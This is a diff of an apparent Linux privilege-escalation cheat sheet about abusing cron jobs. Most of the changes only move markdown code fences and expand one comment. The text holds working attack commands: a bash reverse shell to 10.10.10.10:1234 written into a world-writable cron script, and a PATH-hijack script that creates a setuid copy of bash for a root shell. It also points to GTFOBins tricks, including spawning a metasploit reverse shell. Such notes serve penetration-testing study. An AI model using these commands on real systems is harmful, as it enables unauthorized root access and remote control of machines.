@@ -86,25 +86,26 @@ ls -l /usr/local/bin/example.sh       # check if the file is world-writable
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.10.10/1234 0>&1  # Overwrite the file with this simple one-liner, open up a listening port on 1234 and wait for the call-back
 ```
+```
 cat /etc/crontab                      # check for cron jobs, look for the PATH variable
 
 Here I will leave an example: /home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin. In this case the PATH variable is /home/user, we are going to invoke a shell here with root priviliges.
 
 Create a file with the following content:
 
-```
+
 #!/bin/bash
 
 cp /bin/bash /tmp/rootbash
 chmod +xs /tmp/rootbash
-```
+
 
 chmod +x /home/user/example.sh        # make the file executable and wait a minute or two
-/tmp/rootbash -p                      # invoke the shell with the following command
-
-
+/tmp/rootbash -p                      # invoke the shell with the following command, the -p switch maintains the permission of the owner.
+```
+```
 cat /usr/local/bin/example.sh         # check the content of a cronjob and look for wildcards (*)
-
+```
 Check gtfobins for exploitation methods and use them. You can find a lot of things, but the basic idea is that you trick the program to think that the commands thar are going to be executed are part of it's features. This way you can gain trick the binary to rain a metasploit reverse-shell, execute additional commands or to simply elevate you to root.
 
 
